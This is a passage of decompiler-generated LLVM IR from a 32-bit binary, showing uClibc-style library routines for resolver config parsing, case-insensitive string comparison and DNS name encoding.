  store i32 %v1_80681a9, i32* @esi, align 4
  %v1_80681aa = icmp eq i32 %v5_80681a6, 0
  br i1 %v1_80681aa, label %dec_label_pc_80681c1.backedge, label %dec_label_pc_80681ae

dec_label_pc_80681ae:                             ; preds = %dec_label_pc_80681a6
  %v0_80681ae = load i32, i32* @edx, align 4
  %v6_80681b5 = call i32 @__GI_strcasecmp(i8* %v5_80681b5, i32 %v5_80681a6, i32 %v0_80681ae, i32 %v0_80681ae)
  store i32 %v6_80681b5, i32* %eax.global-to-local, align 4
  %v1_80681bd = icmp eq i32 %v6_80681b5, 0
  br i1 %v1_80681bd, label %dec_label_pc_80681cb, label %dec_label_pc_80681ae.dec_label_pc_80681c1.backedge_crit_edge

dec_label_pc_80681ae.dec_label_pc_80681c1.backedge_crit_edge: ; preds = %dec_label_pc_80681ae
  %v0_80681c1.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80681c1.backedge

dec_label_pc_80681c1.backedge:                    ; preds = %dec_label_pc_80681ae.dec_label_pc_80681c1.backedge_crit_edge, %dec_label_pc_80681a6
  %v1_80681a6.be = phi i32 [ %v0_80681c1.pre.pre, %dec_label_pc_80681ae.dec_label_pc_80681c1.backedge_crit_edge ], [ %v1_80681a9, %dec_label_pc_80681a6 ]
  %v7_80681c4 = icmp sgt i32 %v1_80681a6.be, 3
  br i1 %v7_80681c4, label %dec_label_pc_8068260, label %dec_label_pc_80681a6

dec_label_pc_80681cb:                             ; preds = %dec_label_pc_8068188, %dec_label_pc_80681ae
  %v0_80681cb = load i32, i32* @ebx, align 4
  %v1_80681cb = inttoptr i32 %v0_80681cb to i32*
  %v2_80681cb = load i32, i32* %v1_80681cb, align 4
  %v1_80681cd = load i32, i32* @ebp, align 4
  %v2_80681cd = inttoptr i32 %v1_80681cd to i32*
  store i32 %v2_80681cb, i32* %v2_80681cd, align 4
  %v0_80681d0 = load i32, i32* @ebx, align 4
  %v1_80681d0 = add i32 %v0_80681d0, 4
  %v1_80681d3 = load i32, i32* @ebp, align 4
  %v2_80681d3 = add i32 %v1_80681d3, 4
  %v3_80681d3 = inttoptr i32 %v2_80681d3 to i32*
  store i32 %v1_80681d0, i32* %v3_80681d3, align 4
  store i32 %v0_8068161, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_80681da, align 4
  %v0_80681e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80681e1 = load i32, i32* @ebp, align 4
  %v2_80681e1 = add i32 %v1_80681e1, 16
  %v3_80681e1 = inttoptr i32 %v2_80681e1 to i32*
  store i32 %v0_80681e1, i32* %v3_80681e1, align 4
  store i32 %arg6, i32* @edx, align 4
  store i32 %v1_80681ec, i32* %eax.global-to-local, align 4
  store i32 %v1_80681ec, i32* %v3_80681f4, align 4
  br i1 %v1_80681f7, label %dec_label_pc_8068225, label %dec_label_pc_80681f9

dec_label_pc_80681f9:                             ; preds = %dec_label_pc_80681cb
  %v3_80681fb = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80681fb, i32* %eax.global-to-local, align 4
  %v1_80681ff = inttoptr i32 %v3_80681fb to i32*
  %v2_80681ff = load i32, i32* %v1_80681ff, align 4
  %v5_8068203 = inttoptr i32 %v2_80681ff to i8*
  %v6_8068203 = call i32 @inet_pton(i32 2, i8* %v5_8068203)
  store i32 %v6_8068203, i32* %eax.global-to-local, align 4
  %tmp53 = icmp slt i32 %v6_8068203, 1
  br i1 %tmp53, label %dec_label_pc_8068260.outer, label %dec_label_pc_806820f

dec_label_pc_806820f:                             ; preds = %dec_label_pc_80681f9
  store i32 %arg8, i32* %eax.global-to-local, align 4
  %v0_8068213 = load i32, i32* @ebp, align 4
  %v1_8068213 = add i32 %v0_8068213, 8
  %v2_8068213 = inttoptr i32 %v1_8068213 to i32*
  store i32 2, i32* %v2_8068213, align 4
  %v0_806821a = load i32, i32* @ebp, align 4
  %v1_806821a = add i32 %v0_806821a, 12
  %v2_806821a = inttoptr i32 %v1_806821a to i32*
  store i32 4, i32* %v2_806821a, align 4
  %v0_8068221 = load i32, i32* @ebp, align 4
  %v1_8068221 = load i32, i32* %eax.global-to-local, align 4
  %v2_8068221 = inttoptr i32 %v1_8068221 to i32*
  store i32 %v0_8068221, i32* %v2_8068221, align 4
  br label %dec_label_pc_8068287

dec_label_pc_8068225:                             ; preds = %dec_label_pc_80681cb
  br i1 %v1_806822a, label %dec_label_pc_8068260.outer, label %dec_label_pc_806822c

dec_label_pc_806822c:                             ; preds = %dec_label_pc_8068225
  %v3_806822e = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_806822e, i32* %eax.global-to-local, align 4
  %v1_8068232 = inttoptr i32 %v3_806822e to i32*
  %v2_8068232 = load i32, i32* %v1_8068232, align 4
  %v5_8068236 = inttoptr i32 %v2_8068232 to i8*
  %v6_8068236 = call i32 @inet_pton(i32 10, i8* %v5_8068236)
  store i32 %v6_8068236, i32* %eax.global-to-local, align 4
  %tmp54 = icmp slt i32 %v6_8068236, 1
  br i1 %tmp54, label %dec_label_pc_8068260.outer, label %dec_label_pc_8068242

dec_label_pc_8068242:                             ; preds = %dec_label_pc_806822c
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v0_8068246 = load i32, i32* @ebp, align 4
  %v1_8068246 = add i32 %v0_8068246, 8
  %v2_8068246 = inttoptr i32 %v1_8068246 to i32*
  store i32 10, i32* %v2_8068246, align 4
  %v0_806824d = load i32, i32* @ebp, align 4
  %v1_806824d = add i32 %v0_806824d, 12
  %v2_806824d = inttoptr i32 %v1_806824d to i32*
  store i32 16, i32* %v2_806824d, align 4
  %v0_8068254 = load i32, i32* @ebp, align 4
  %v1_8068254 = load i32, i32* %edx.global-to-local, align 4
  %v2_8068254 = inttoptr i32 %v1_8068254 to i32*
  store i32 %v0_8068254, i32* %v2_8068254, align 4
  br label %dec_label_pc_8068287

dec_label_pc_8068260:                             ; preds = %dec_label_pc_80681c1.backedge, %dec_label_pc_8068188, %dec_label_pc_8068260.outer
  store i32 %v2_806826a, i32* %eax.global-to-local, align 4
  %v0_806826f = load i32, i32* @edi, align 4
  %v5_8068270 = inttoptr i32 %v0_806826f to i32*
  %v6_8068270 = call i32 @__GI_config_read(i32* %v5_8068270, i32 %v2_806826a, i32 459270, i32 ptrtoint ([4 x i8]* @global_var_807043f.1733 to i32))
  store i32 %v6_8068270, i32* %eax.global-to-local, align 4
  %v1_8068278 = icmp eq i32 %v6_8068270, 0
  %v1_806827a = icmp eq i1 %v1_8068278, false
  br i1 %v1_806827a, label %dec_label_pc_806816a, label %dec_label_pc_8068280

dec_label_pc_8068280:                             ; preds = %dec_label_pc_8068260
  br i1 %v12_8068171, label %dec_label_pc_806829f, label %dec_label_pc_8068287

dec_label_pc_8068287:                             ; preds = %dec_label_pc_806820f, %dec_label_pc_8068242, %dec_label_pc_8068280
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0.ph, %dec_label_pc_8068280 ], [ 0, %dec_label_pc_8068242 ], [ 0, %dec_label_pc_806820f ]
  %v0_806828a = load i32, i32* @edi, align 4
  %v1_806828b = inttoptr i32 %v0_806828a to i32*
  %v2_806828b = call i32 @__GI_config_close(i32* %v1_806828b)
  store i32 %v2_806828b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806829f

dec_label_pc_806829f:                             ; preds = %dec_label_pc_806816a, %dec_label_pc_8068280, %entry, %dec_label_pc_8068287, %dec_label_pc_8068121
  %stack_var_-36.2 = phi i32 [ 34, %entry ], [ %stack_var_-36.1, %dec_label_pc_8068287 ], [ %stack_var_-36.0.ph, %dec_label_pc_8068280 ], [ %v2_8068130, %dec_label_pc_8068121 ], [ %stack_var_-36.0.ph, %dec_label_pc_806816a ]
  store i32 %stack_var_-36.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80680dc, i32* @ebx, align 4
  store i32 %v0_80680db, i32* @esi, align 4
  store i32 %v0_80680da, i32* @edi, align 4
  store i32 %v0_80680d9, i32* @ebp, align 4
  ret i32 %stack_var_-36.2

; uselistorder directives
  uselistorder i32 %stack_var_-36.2, { 1, 0 }
  uselistorder i32 %v5_80681a6, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0.ph, { 0, 2, 1 }
  uselistorder i8* %v5_80681b5, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 14, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 12, { 89, 90, 95, 37, 97, 18, 38, 39, 98, 26, 19, 20, 21, 22, 23, 25, 24, 7, 8, 3, 4, 27, 1, 2, 0, 5, 109, 28, 29, 30, 31, 32, 42, 110, 33, 6, 58, 9, 105, 61, 62, 96, 59, 60, 161, 99, 100, 101, 102, 103, 104, 93, 94, 111, 112, 106, 113, 114, 115, 116, 117, 118, 119, 120, 10, 121, 122, 123, 107, 108, 162, 91, 11, 12, 34, 92, 63, 64, 65, 66, 67, 163, 17, 164, 68, 88, 45, 70, 71, 69, 83, 87, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 43, 160, 165, 124, 13, 14, 125, 126, 35, 36, 127, 15, 166, 72, 73, 74, 75, 76, 77, 40, 78, 79, 41, 80, 81, 82, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 84, 85, 44, 86, 16 }
  uselistorder i32 3, { 18, 46, 47, 48, 49, 50, 51, 0, 19, 1, 20, 2, 52, 3, 45, 8, 15, 7, 6, 21, 9, 40, 16, 17, 25, 26, 27, 28, 29, 30, 36, 41, 44, 31, 53, 13, 14, 5, 32, 33, 22, 11, 12, 23, 34, 35, 42, 43, 4, 24, 37, 38, 39, 10 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 27, 28, 29, 30, 31, 32, 33, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 10, { 51, 40, 0, 53, 54, 56, 23, 57, 58, 59, 60, 49, 1, 16, 41, 2, 12, 61, 24, 62, 63, 42, 18, 3, 13, 14, 15, 43, 4, 64, 19, 5, 52, 6, 48, 55, 17, 65, 10, 44, 45, 7, 38, 39, 20, 21, 25, 26, 28, 29, 30, 37, 36, 35, 34, 33, 32, 27, 31, 11, 50, 8, 46, 47, 22, 9 }
  uselistorder i32 32, { 56, 58, 59, 40, 67, 68, 39, 69, 70, 71, 72, 73, 74, 75, 60, 61, 52, 53, 89, 3, 62, 63, 57, 64, 65, 76, 66, 42, 41, 55, 28, 51, 50, 5, 4, 6, 7, 43, 8, 9, 54, 10, 11, 12, 13, 14, 77, 78, 79, 0, 80, 81, 82, 83, 84, 85, 86, 15, 87, 44, 45, 90, 91, 88, 30, 16, 46, 17, 47, 1, 19, 18, 31, 21, 20, 32, 33, 48, 2, 34, 22, 23, 25, 24, 35, 37, 27, 26, 36, 38, 29, 49 }
  uselistorder i32 24, { 33, 38, 40, 8, 2, 0, 50, 51, 41, 42, 16, 17, 7, 18, 43, 44, 39, 52, 53, 48, 45, 46, 47, 34, 35, 54, 49, 9, 36, 37, 19, 3, 20, 4, 21, 63, 22, 23, 32, 10, 55, 56, 57, 58, 59, 60, 61, 62, 64, 24, 25, 26, 27, 28, 29, 5, 30, 6, 11, 12, 13, 14, 15, 31, 1 }
  uselistorder i32 4, {}
  uselistorder i32 16, { 74, 75, 87, 89, 92, 93, 94, 95, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 5, 99, 124, 125, 45, 46, 47, 48, 90, 91, 42, 43, 13, 164, 165, 44, 0, 96, 97, 98, 17, 9, 88, 4, 12, 126, 127, 128, 129, 130, 104, 105, 100, 101, 102, 103, 76, 77, 78, 131, 132, 133, 134, 135, 136, 137, 138, 139, 106, 10, 7, 166, 14, 79, 80, 81, 82, 83, 84, 85, 86, 49, 50, 51, 167, 172, 69, 52, 15, 31, 18, 32, 54, 53, 73, 162, 2, 1, 163, 19, 11, 173, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 20, 157, 158, 159, 160, 168, 169, 170, 171, 30, 21, 22, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 16, 23, 67, 24, 25, 68, 33, 34, 35, 36, 37, 38, 39, 40, 41, 70, 71, 8, 72, 3, 26, 161, 6, 27, 28, 29 }
  uselistorder i32 48, { 18, 11, 10, 5, 6, 7, 21, 19, 16, 17, 0, 12, 1, 2, 20, 13, 4, 15, 8, 9, 22, 23, 24, 25, 3, 14 }
  uselistorder i32 8, { 110, 111, 113, 115, 116, 117, 118, 7, 119, 120, 121, 122, 123, 28, 47, 21, 22, 23, 24, 25, 27, 26, 29, 144, 30, 31, 32, 33, 34, 48, 0, 17, 49, 79, 133, 134, 135, 136, 41, 137, 145, 81, 82, 80, 224, 225, 125, 126, 127, 128, 129, 130, 131, 132, 114, 146, 147, 138, 139, 148, 149, 150, 151, 152, 153, 42, 50, 154, 155, 156, 157, 140, 141, 142, 143, 226, 227, 228, 124, 51, 35, 112, 83, 84, 85, 86, 229, 39, 235, 236, 1, 87, 109, 40, 55, 36, 89, 90, 88, 105, 108, 175, 176, 177, 178, 179, 180, 181, 8, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 9, 19, 193, 194, 195, 53, 10, 196, 54, 11, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 52, 215, 216, 12, 217, 218, 219, 220, 221, 222, 13, 223, 14, 234, 158, 2, 3, 56, 159, 20, 160, 162, 163, 164, 161, 165, 166, 167, 168, 37, 38, 169, 170, 171, 172, 173, 174, 230, 231, 232, 233, 4, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 43, 101, 102, 103, 44, 104, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 18, 106, 45, 107, 5, 6, 46, 16, 15 }
  uselistorder i32 -48, { 1, 2, 4, 3, 0 }
  uselistorder i32* inttoptr (i32 -8 to i32*), { 45, 1, 2, 3, 4, 5, 46, 47, 48, 49, 50, 51, 52, 53, 6, 54, 7, 8, 9, 10, 11, 12, 55, 56, 57, 13, 14, 58, 59, 60, 61, 62, 15, 0, 16, 17, 18, 19, 20, 21, 63, 22, 44, 23, 64, 24, 25, 65, 66, 67, 68, 69, 70, 26, 27, 71, 72, 73, 74, 75, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43 }
  uselistorder i32 -8, { 49, 51, 52, 53, 13, 12, 8, 7, 9, 10, 11, 14, 4, 15, 16, 17, 18, 59, 19, 44, 20, 45, 41, 54, 42, 55, 56, 50, 60, 61, 57, 58, 67, 24, 22, 23, 25, 26, 27, 21, 28, 46, 0, 47, 68, 48, 29, 63, 64, 65, 66, 43, 6, 35, 5, 62, 30, 31, 32, 33, 34, 36, 37, 38, 39, 69, 2, 1, 3, 40 }
  uselistorder i32 34, { 5, 4, 10, 11, 14, 8, 9, 12, 13, 6, 1, 2, 7, 3, 0 }
  uselistorder i32 129, { 0, 2, 1 }
  uselistorder i32* @ebp, { 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 120, 121, 122, 123, 133, 134, 15, 16, 17, 18, 0, 19, 4, 135, 136, 137, 142, 138, 139, 140, 141, 143, 116, 117, 118, 119, 144, 145, 146, 147, 148, 149, 1, 124, 128, 129, 125, 126, 127, 150, 151, 152, 153, 154, 5, 155, 156, 157, 158, 159, 160, 130, 131, 132, 86, 87, 90, 88, 89, 91, 92, 93, 94, 249, 250, 69, 68, 6, 9, 70, 72, 71, 7, 10, 73, 20, 21, 22, 44, 45, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 2, 218, 219, 220, 221, 222, 223, 224, 225, 3, 232, 226, 227, 228, 229, 230, 231, 233, 161, 162, 163, 164, 165, 166, 167, 168, 172, 173, 174, 175, 176, 177, 178, 179, 180, 8, 181, 12, 13, 14, 169, 170, 171, 182, 183, 184, 185, 186, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 11, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 74, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 234, 235, 236, 237, 238, 239, 240, 243, 244, 241, 242, 245, 246, 247, 248 }
  uselistorder i32 %arg8, { 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_806829f, { 3, 1, 0, 4, 2 }
  uselistorder label %dec_label_pc_8068287, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80681cb, { 1, 0 }
  uselistorder label %dec_label_pc_80681a6, { 1, 0 }
  uselistorder label %dec_label_pc_8068260.outer, { 2, 1, 0, 3 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_80682b0 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_80682b8

dec_label_pc_80682b8:                             ; preds = %dec_label_pc_80682db, %entry
  %v0_80682e14 = phi i32 [ %v0_80682e15, %dec_label_pc_80682db ], [ 0, %entry ]
  %v0_80682db = phi i32 [ %v1_80682db, %dec_label_pc_80682db ], [ %arg2, %entry ]
  %v0_80682dc = phi i32 [ %v1_80682dc, %dec_label_pc_80682db ], [ %v4_80682b0, %entry ]
  %v12_80682b8 = icmp eq i32 %v0_80682dc, %v0_80682db
  br i1 %v12_80682b8, label %dec_label_pc_80682b8.dec_label_pc_80682d6_crit_edge, label %dec_label_pc_80682bc

dec_label_pc_80682b8.dec_label_pc_80682d6_crit_edge: ; preds = %dec_label_pc_80682b8
  %.pre = inttoptr i32 %v0_80682dc to i8*
  br label %dec_label_pc_80682d6

dec_label_pc_80682bc:                             ; preds = %dec_label_pc_80682b8
  %v0_80682bc = load i32, i32* bitcast (i32** @global_var_8071afc.1590 to i32*), align 4
  %v1_80682c2 = inttoptr i32 %v0_80682dc to i8*
  %v2_80682c2 = load i8, i8* %v1_80682c2, align 1
  %v3_80682c2 = zext i8 %v2_80682c2 to i32
  %v2_80682c5 = mul nuw nsw i32 %v3_80682c2, 2
  %v3_80682c5 = add i32 %v2_80682c5, %v0_80682bc
  %v4_80682c5 = inttoptr i32 %v3_80682c5 to i16*
  %v5_80682c5 = load i16, i16* %v4_80682c5, align 2
  %v6_80682c5 = sext i16 %v5_80682c5 to i32
  %v1_80682c9 = inttoptr i32 %v0_80682db to i8*
  %v2_80682c9 = load i8, i8* %v1_80682c9, align 1
  %v3_80682c9 = zext i8 %v2_80682c9 to i32
  %v2_80682cc = mul nuw nsw i32 %v3_80682c9, 2
  %v3_80682cc = add i32 %v2_80682cc, %v0_80682bc
  %v4_80682cc = inttoptr i32 %v3_80682cc to i16*
  %v5_80682cc = load i16, i16* %v4_80682cc, align 2
  %v6_80682cc = sext i16 %v5_80682cc to i32
  %v2_80682d0 = sub nsw i32 %v6_80682c5, %v6_80682cc
  %v12_80682d0 = icmp eq i32 %v2_80682d0, 0
  store i32 %v2_80682d0, i32* @edx, align 4
  %v1_80682d4 = icmp eq i1 %v12_80682d0, false
  br i1 %v1_80682d4, label %dec_label_pc_80682df, label %dec_label_pc_80682d6

dec_label_pc_80682d6:                             ; preds = %dec_label_pc_80682b8.dec_label_pc_80682d6_crit_edge, %dec_label_pc_80682bc
  %v1_80682d6.pre-phi = phi i8* [ %.pre, %dec_label_pc_80682b8.dec_label_pc_80682d6_crit_edge ], [ %v1_80682c2, %dec_label_pc_80682bc ]
  %v0_80682e15 = phi i32 [ %v0_80682e14, %dec_label_pc_80682b8.dec_label_pc_80682d6_crit_edge ], [ %v2_80682d0, %dec_label_pc_80682bc ]
  %v2_80682d6 = load i8, i8* %v1_80682d6.pre-phi, align 1
  %v3_80682d6 = icmp eq i8 %v2_80682d6, 0
  br i1 %v3_80682d6, label %dec_label_pc_80682df, label %dec_label_pc_80682db

dec_label_pc_80682db:                             ; preds = %dec_label_pc_80682d6
  %v1_80682db = add i32 %v0_80682db, 1
  %v1_80682dc = add i32 %v0_80682dc, 1
  br label %dec_label_pc_80682b8

dec_label_pc_80682df:                             ; preds = %dec_label_pc_80682d6, %dec_label_pc_80682bc
  %v0_80682e1 = phi i32 [ %v0_80682e15, %dec_label_pc_80682d6 ], [ %v2_80682d0, %dec_label_pc_80682bc ]
  ret i32 %v0_80682e1

; uselistorder directives
  uselistorder i32 %v0_80682e15, { 1, 0 }
  uselistorder i32 %v2_80682d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80682dc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_80682db, { 1, 2, 0 }
  uselistorder i32* @edx, { 174, 175, 176, 186, 187, 16, 188, 190, 189, 191, 192, 193, 194, 26, 28, 27, 0, 222, 223, 224, 225, 226, 227, 228, 229, 230, 238, 231, 232, 233, 234, 235, 236, 237, 239, 240, 200, 241, 242, 243, 244, 304, 29, 303, 6, 284, 7, 2, 17, 42, 3, 18, 245, 246, 201, 211, 212, 213, 202, 203, 8, 204, 208, 209, 210, 205, 206, 207, 214, 215, 177, 178, 179, 180, 181, 247, 248, 249, 250, 216, 217, 218, 219, 220, 9, 221, 307, 308, 309, 310, 10, 311, 277, 195, 196, 197, 198, 183, 182, 184, 185, 30, 31, 32, 33, 306, 49, 51, 50, 312, 313, 285, 286, 52, 316, 320, 321, 328, 327, 317, 318, 11, 329, 330, 53, 170, 171, 314, 315, 199, 34, 35, 288, 12, 287, 289, 290, 19, 13, 278, 279, 1, 283, 291, 305, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 15, 265, 266, 267, 14, 4, 268, 269, 271, 272, 273, 274, 24, 25, 270, 275, 276, 319, 324, 280, 281, 282, 38, 39, 40, 322, 323, 325, 326, 36, 37, 41, 43, 44, 45, 46, 47, 48, 20, 21, 22, 23, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 172, 173, 292, 293, 294, 295, 297, 302, 296, 298, 300, 301, 5, 299, 331 }
  uselistorder i32 2, { 115, 116, 117, 64, 33, 34, 35, 0, 1, 118, 95, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 3, 2, 44, 131, 133, 132, 135, 136, 96, 137, 138, 36, 103, 4, 104, 105, 139, 140, 5, 65, 141, 142, 130, 16, 17, 18, 50, 51, 143, 144, 7, 6, 8, 156, 157, 9, 10, 11, 45, 145, 146, 61, 19, 52, 53, 134, 66, 67, 68, 69, 70, 71, 72, 165, 46, 166, 54, 73, 47, 12, 164, 97, 94, 101, 102, 40, 20, 129, 74, 21, 22, 55, 23, 24, 38, 159, 25, 26, 62, 56, 167, 109, 110, 147, 154, 155, 41, 42, 43, 148, 149, 49, 27, 28, 150, 29, 151, 30, 57, 152, 153, 31, 158, 163, 63, 106, 76, 75, 77, 13, 14, 58, 107, 108, 78, 79, 59, 80, 81, 82, 48, 83, 84, 85, 86, 98, 99, 100, 87, 88, 111, 37, 112, 15, 113, 89, 39, 114, 90, 91, 92, 162, 60, 160, 32, 161, 93 }
  uselistorder i32 65536, { 1, 2, 0, 3, 5, 4, 7, 6, 9, 8, 11, 10, 12, 13, 75, 74, 73, 71, 76, 14, 15, 19, 16, 20, 17, 21, 18, 25, 22, 26, 23, 27, 24, 28, 29, 31, 30, 33, 32, 34, 38, 35, 39, 36, 40, 37, 41, 43, 42, 46, 44, 47, 45, 48, 49, 52, 50, 53, 51, 54, 55, 57, 56, 58, 59, 62, 63, 64, 60, 65, 61, 67, 66, 68, 70, 69, 72 }
  uselistorder label %dec_label_pc_80682d6, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_80682e5 = load i32, i32* @edi, align 4
  %v0_80682e6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80682ed = ptrtoint i8* %arg1 to i32
  store i32 %v4_80682ed, i32* @edi, align 4
  %v1_806834d6 = icmp eq i8* %arg1, null
  br i1 %v1_806834d6, label %dec_label_pc_8068356, label %dec_label_pc_8068351.lr.ph

dec_label_pc_8068351.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8068351

dec_label_pc_80682f3:                             ; preds = %dec_label_pc_8068351
  %v5_80682f8 = call i32 @__GI_strchr(i8* %v1_8068351, i32 46)
  %v1_8068300 = icmp eq i32 %v5_80682f8, 0
  br i1 %v1_8068300, label %dec_label_pc_806830c, label %dec_label_pc_8068306

dec_label_pc_8068306:                             ; preds = %dec_label_pc_80682f3
  %v1_8068308 = load i32, i32* @edi, align 4
  %v2_8068308 = sub i32 %v5_80682f8, %v1_8068308
  br label %dec_label_pc_806831a

dec_label_pc_806830c:                             ; preds = %dec_label_pc_80682f3
  %v0_806830f = load i32, i32* @edi, align 4
  %v5_806830f = inttoptr i32 %v0_806830f to i8*
  %v3_8068310 = call i32 @strlen(i8* %v5_806830f)
  br label %dec_label_pc_806831a

dec_label_pc_806831a:                             ; preds = %dec_label_pc_8068306, %dec_label_pc_806830c
  %v0_806832d = phi i32 [ %v2_8068308, %dec_label_pc_8068306 ], [ %v3_8068310, %dec_label_pc_806830c ]
  store i32 %v0_806832d, i32* @esi, align 4
  %v1_806831a = icmp eq i32 %v0_806832d, 0
  %v3_806831a = trunc i32 %v0_806832d to i8
  br i1 %v1_806831a, label %dec_label_pc_806836a, label %dec_label_pc_806831e

dec_label_pc_806831e:                             ; preds = %dec_label_pc_806831a
  %v1_8068322 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8068322 = sub i32 %arg3, %v1_8068322
  %v1_8068324 = add i32 %v2_8068322, -1
  %v7_8068325 = icmp ult i32 %v0_806832d, %v1_8068324
  %v1_8068327 = icmp eq i1 %v7_8068325, false
  br i1 %v1_8068327, label %dec_label_pc_806836a, label %dec_label_pc_8068329

dec_label_pc_8068329:                             ; preds = %dec_label_pc_806831e
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v4_806832f = add i32 %v1_8068322, %arg2
  %v5_806832f = inttoptr i32 %v4_806832f to i8*
  store i8 %v3_806831a, i8* %v5_806832f, align 1
  %v0_8068332 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8068332 = add i32 %v0_8068332, 1
  store i32 %v1_8068332, i32* %ebx.global-to-local, align 4
  %v0_8068334 = load i32, i32* %edx.global-to-local, align 4
  %v0_8068336 = load i32, i32* @esi, align 4
  %v2_8068337 = add i32 %v0_8068334, %v1_8068332
  %v0_8068339 = load i32, i32* @edi, align 4
  %v5_806833a = inttoptr i32 %v2_8068337 to i8*
  %v7_806833b = call i32 @memcpy(i8* %v5_806833a, i32 %v0_8068339, i32 %v0_8068336)
  %v0_8068345 = load i32, i32* @esi, align 4
  %v1_8068345 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8068345 = add i32 %v1_8068345, %v0_8068345
  store i32 %v2_8068345, i32* %ebx.global-to-local, align 4
  %v1_806834a = add i32 %v5_80682f8, 1
  br i1 %v1_8068300, label %dec_label_pc_8068356, label %dec_label_pc_806834d

dec_label_pc_806834d:                             ; preds = %dec_label_pc_8068329
  store i32 %v1_806834a, i32* @edi, align 4
  %v1_806834d = icmp eq i32 %v1_806834a, 0
  br i1 %v1_806834d, label %dec_label_pc_8068356, label %dec_label_pc_8068351

dec_label_pc_8068351:                             ; preds = %dec_label_pc_8068351.lr.ph, %dec_label_pc_806834d
  %v1_806836114 = phi i32 [ 0, %dec_label_pc_8068351.lr.ph ], [ %v2_8068345, %dec_label_pc_806834d ]
  %v0_80682f7 = phi i32 [ %v4_80682ed, %dec_label_pc_8068351.lr.ph ], [ %v1_806834a, %dec_label_pc_806834d ]
  %v1_8068351 = inttoptr i32 %v0_80682f7 to i8*
  %v2_8068351 = load i8, i8* %v1_8068351, align 1
  %v3_8068351 = icmp eq i8 %v2_8068351, 0
  %v1_8068354 = icmp eq i1 %v3_8068351, false
  br i1 %v1_8068354, label %dec_label_pc_80682f3, label %dec_label_pc_8068356

dec_label_pc_8068356:                             ; preds = %dec_label_pc_806834d, %dec_label_pc_8068351, %dec_label_pc_8068329, %entry
